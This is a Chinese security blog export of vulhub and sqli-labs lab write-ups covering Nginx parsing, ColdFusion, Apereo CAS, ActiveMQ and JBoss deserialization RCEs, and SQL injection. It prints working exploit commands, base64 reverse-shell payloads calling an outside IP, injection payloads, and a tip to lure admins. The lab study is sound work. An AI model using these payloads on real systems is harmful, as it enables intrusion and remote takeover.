<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           &#x2F;work&#x2F;www&#x2F;test;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    </span><br><span class="line">	$document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:&#x2F;tmp&#x2F;php-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当攻击者访问<code>/info.jpg/xxx.php</code>时， <code>Nginx</code>将查看<code>URL</code>，看到它以<code>.php</code>结尾，并将路径传递给<code>PHP fastcgi</code>处理程序。</p>
<p><code>Nginx</code>传给<code>php</code>的路径为<code>c:/WWW/info.jpg/xxx.php</code>,<br>在<code>phpinfo</code>中可以查看<code>_SERVER[&quot;ORIG_SCRIPT_FILENAME&quot;]</code>得到。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101216.png" alt="image"></p>
<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p>
<p><img src="https://qiniu.hzktester.top/tp2020101206.png" alt="image"></p>
<p>结果如下：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101207.png" alt="image"></p>
<p>如果需要使用到<code>cgi.fix_pathinfo</code>这个特性（例如：<code>Wordpress</code>），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p>
<p>或高版本<code>PHP</code>提供了<code>security.limit_extensions</code>这个配置参数，设置<code>security.limit_extensions = .php</code></p>
<hr>
<p>转载自<a href="https://www.lxhsec.com/2019/03/04/middleware/">lxhsec</a></p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</title>
    <url>/posts/ca77975b.html</url>
    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Adobe ColdFusion</code>是美国<code>Adobe</code>公司的一款动态Web服务器产品，其运行的<code>CFML（ColdFusion Markup Language）</code>是针对Web应用的一种程序设计语言。</p>
<p><code>Adobe ColdFusion</code>中存在<code>java</code>反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：<code>Adobe ColdFusion (2016 release) Update 3</code>及之前的版本，<code>ColdFusion 11 Update 11</code>及之前的版本，<code>oldFusion 10 Update 22</code>及之前的版本。</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>启动漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>等待数分钟时间，环境启动成功，访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装<code>Adobe ColdFusion</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020101013.png" alt="image"></p>
<p>安装成功后页面如下：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101014.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p>
<p>同时获取最新版的<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a>。放在同一目录下</p>
<p>生成POC（执行命令<code>touch /tmp/success</code>）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101015.png" alt="image"></p>
<p>POC生成于<code>poc.ser</code>文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，<code>Content-Type</code>为<code>application/x-amf</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;flex2gateway&#x2F;amf HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101016.png" alt="image"></p>
<p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101017.png" alt="image"></p>
<p>接下来试一下反弹<code>shell</code>（生成一个反弹shell的poc）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; shell.ser</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101018.png" alt="image"></p>
<p>使用<code>curl</code>命令提交poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8500&#x2F;flex2gateway&#x2F;amf --data-binary @shell.ser</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101019.png" alt="image"></p>
<p>成功反弹shell：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101020.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Adobe ColdFusion</tag>
      </tags>
  </entry>
  <entry>
    <title>Apereo CAS 4.1 反序列化命令执行漏洞</title>
    <url>/posts/a52bba00.html</url>
    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apereo CAS</code>是一款<code>Apereo</code>发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>vulhub</code>启动漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101009.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞原理是<code>Webflow</code>中使用了默认密钥<code>changeit</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure>
<p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用<code>ysoserial</code>的<code>CommonsCollections4</code>生成加密后的<code>Payload</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101010.png" alt="image"></p>
<p>然后登录<code>CAS</code>并抓包，将<code>Body</code>中的<code>execution</code>值替换成上面生成的<code>Payload</code>发送：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;your-ip:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101011.png" alt="image"></p>
<p>进入容器，可见<code>touch /tmp/success</code>已成功执行：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101012.png" alt="image"></p>
<p>反弹<code>shell</code>只需将<code>touch /tmp/success</code>替换即可</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apereo CAS</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）</title>
    <url>/posts/5632f60a.html</url>
    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apache ActiveMQ</code>是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持<code>Java</code>消息服务、集群、<code>Spring Framework</code>等。</p>
<p><code>Apache ActiveMQ 5.13.0</code>之前<code>5.x</code>版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的<code>Java Message Service(JMS)ObjectMessage</code>对象利用该漏洞执行任意代码。</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>运行漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;activemq&#x2F;CVE-2015-5254&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>环境运行后，将监听<code>61616</code>和<code>8161</code>两个端口。其中<code>61616</code>是工作端口，消息在这个端口进行传递；<code>8161</code>是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101001.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p>
<ol>
<li>构造（可以使用<code>ysoserial</code>）可执行命令的序列化对象</li>
<li>作为一个消息，发送给目标<code>61616</code>端口</li>
<li>访问web管理页面，读取消息，触发漏洞</li>
</ol>
<p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载<code>jmet</code>的jar文件，并在同目录下创建一个<code>external</code>文件夹（否则可能会报文件夹不存在的错误）。</p>
<p><img src="https://qiniu.hzktester.top/tp2020101002.png" alt="image"></p>
<p><code>jmet</code>原理是使用<code>ysoserial</code>生成<code>Payload</code>并发送（其<code>jar</code>内自带<code>ysoserial</code>，无需再自己下载），所以我们需要在<code>ysoserial</code>是<code>gadget</code>中选择一个可以使用的，比如<code>ROME</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101003.png" alt="image"></p>
<p>此时会给目标<code>ActiveMQ</code>添加一个名为<code>event</code>的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
<p>默认的用户名和密码为<code>admin</code>，<code>admin</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020101004.png" alt="image"></p>
<p>点击这条消息即可触发命令，此时进入容器<code>docker-compose exec activemq bash</code>，可见<code>/tmp/success</code>已成功创建，说明漏洞利用成功：</p>
<p><img src="https://qiniu.hzktester.top/tp2020101005.png" alt="image"></p>
<p>将命令替换成弹<code>shell</code>语句再利用：</p>
<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Java Runtime</a> 配合<code>bash</code>编码</p>
<p><img src="https://qiniu.hzktester.top/tp2020101006.png" alt="image"></p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020101007.png" alt="image"></p>
<p>反弹shell:</p>
<p><img src="https://qiniu.hzktester.top/tp2020101008.png" alt="image"></p>
<blockquote>
<p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</title>
    <url>/posts/38bd85b0.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>Red Hat JBoss Application Server</code>是一款基于<code>JavaEE</code>的开源应用服务器。<code>JBoss AS 4.x</code>及之前版本中，<code>JbossMQ</code>实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>环境启动后，目标为<code>http://your-ip:8080</code>。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/jbossmq-httpil/HTTPServerILServlet</code></p>
<p>返回<code>This is the JBossMQ HTTP-IL</code>，说明页面存在，此页面存在反序列化漏洞。</p>
<p><img src="https://qiniu.hzktester.top/tp2020100907.png" alt="image"></p>
<p>这里直接利用<code>CVE-2017-12149</code>生成的ser，发送到<code>/jbossmq-httpil/HTTPServerILServlet</code>接口中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020100908.png" alt="image"></p>
<p>反弹shell：</p>
<p><img src="https://qiniu.hzktester.top/tp2020100909.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</title>
    <url>/posts/33d0907b.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞为<code>Java</code>反序列化错误类型，存在于<code>Jboss</code>的<code>HttpInvoker</code>组件中的 <code>ReadOnlyAccessFilter</code>过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响5.x和6.x版本的JBOSSAS</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到<code>JBoss</code>默认页面。</p>
<p><img src="https://qiniu.hzktester.top/tp2020100901.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/invoker/readonly</code>，返回500，说明页面存在，此页面存在反序列化漏洞。</p>
<p><img src="https://qiniu.hzktester.top/tp2020100902.png" alt="image"></p>
<p>利用工具:<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>,我们选择一个<code>Gadget</code>：<code>ReverseShellCommonsCollectionsHashMap</code>，编译并生成序列化数据：</p>
<p><img src="https://qiniu.hzktester.top/tp2020100903.png" alt="image"></p>
<p>生成<code>ReverseShellCommonsCollectionsHashMap.class</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure>

<p>生成<code>ReverseShellCommonsCollectionsHashMap.ser</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 47.101.62.20:1234（ip是nc所在的ip）</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100904.png" alt="image"></p>
<p>利用，监听端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
<p>发送poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100905.png" alt="image"></p>
<p>反弹shell:</p>
<p><img src="https://qiniu.hzktester.top/tp2020100906.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less11-16(二次注入)</title>
    <url>/posts/18b82261.html</url>
    <content><![CDATA[<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>这一关开始使用post注入，什么是post注入呢？</p>
<blockquote>
<p> 就是数据从客户端提交<br>到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，<br>提交到服务器后服务器再进行验证。这就是一次 post 的过程的。</p>
</blockquote>
<p>当我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:admin&#39;</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100404.png" alt="image"></p>
<p>显示错误了，可以从错误中分析到程序对参数进行单引号的处理。<br>这里我们可以在输入框输入万能密码来尝试一下。</p>
<p>这里<code>username</code>输入：<code>admin&#39;or&#39;1&#39;=&#39;1#</code>，密码随意</p>
<p><img src="https://qiniu.hzktester.top/tp2020100405.png" alt="image"></p>
<p>返回的正确的结果，那么原因是什么呢？我们在<code>background-1</code>中已经其实提到了，逻辑运算的部分中已经讲解了原理。</p>
<p>当我们提交<code>username</code>和<code>password</code>后，后台形成的<code>sql</code>语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;or&#39;1&#39;&#x3D;&#39;1# and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在#以后的内容就被注释掉，前面的内容因为or 1=1恒成立，所以语句就成立，我们此时以admin的用户登录。那么接下来我们尝试用get注入中用到的其他的语句代替or 1=1进行注入。</p>
</blockquote>
<p>这里我们用 union 注入进行尝试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username：1admin&#39;union select 1,database()#</span><br><span class="line">passwd&#x3D;1（任意密码）</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100406.png" alt="image"></p>
<p>可以看到显示了<code>database</code>为<code>security</code>，这是我们比较常用的手法。<br>还可以利用其他的方法进行注入</p>
<h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关于11不同之处在于，id参数使用了”)过滤。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:admin&quot;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100407.png" alt="image"></p>
<h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>本关id参数使用了’)过滤。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:admin&#39;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100408.png" alt="image"></p>
<blockquote>
<p>我们可以明显的看到本关不会显示你的登录信息了，只能给你一个是否登录成功的返回数据。那我们这里可以用下布尔类型的盲注。</p>
</blockquote>
<p>猜测数据库第一位:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)and left(database(),1)&gt;&#39;a&#39;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100409.png" alt="image"></p>
<p>登录成功，就这样可以挨着对每一位进行测试，<code>less5</code>中我们已经讲到了这个过程了，这里就不重复了。</p>
<blockquote>
<p>在按位进行猜解的过程中，可以利用二分法，可以有效的降低尝试次<br>数</p>
</blockquote>
<h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关id参数使用了”过滤。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100410.png" alt="image"></p>
<p>登录成功，同样没有输入结果，这里使用报错盲注演示一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100411.png" alt="image"></p>
<p>可以看到报错了，显示版本信息</p>
<h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>本关id参数使用了’过滤，且没有错误提示，那么我们只能靠猜测进行盲注。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100412.png" alt="image"></p>
<p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>
<h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>本关和Less15的处理方法是一样的，同样使用延时注入的方法进行解决。不同的是id参数使用了”)的处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot;)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100413.png" alt="image"></p>
<p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-8-10</title>
    <url>/posts/5809cdbe.html</url>
    <content><![CDATA[<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>经过简单的测试，发现<code>&#39;or 1=1--+</code>返回结果正常，基本确定应该怎么注入了</p>
<p><img src="https://qiniu.hzktester.top/tp2020100401.png" alt="image"></p>
<p>这里查看源码可以看出，对sql报错进行了注释，那么采用报错注入就不行了</p>
<p><img src="https://qiniu.hzktester.top/tp2020100402.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat(0x3a,0x3a,(select user())),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100403.png" alt="image"></p>
<p>如果报错注入可以使用的话是可以直接返回user()的，但是这里没有返回。</p>
<p>其他的payload参考less5直接进行注入即可</p>
<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>本关从标题可以看到《基于时间-单引号》，所以很明显这关要利用延时注入进行，同时id参数进行的是’的处理。大概演示一次演示注入。使用<code>sleep()</code>函数</p>
<p>这里因为利用的是时间的延迟，贴图就没意义了，只写payload了：（正确的时候直接返回，不正确的时候等待5秒钟，只贴正确的）</p>
<h3 id="猜测数据库"><a href="#猜测数据库" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>说明第一位是s（ascii码是115）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),2,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>说明第二位是e（ascii码是101）</p>
<p>……</p>
<p>以此类推，我们知道了数据库名字是<code>security</code></p>
<h3 id="猜测security的数据表"><a href="#猜测security的数据表" class="headerlink" title="猜测security的数据表"></a>猜测security的数据表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
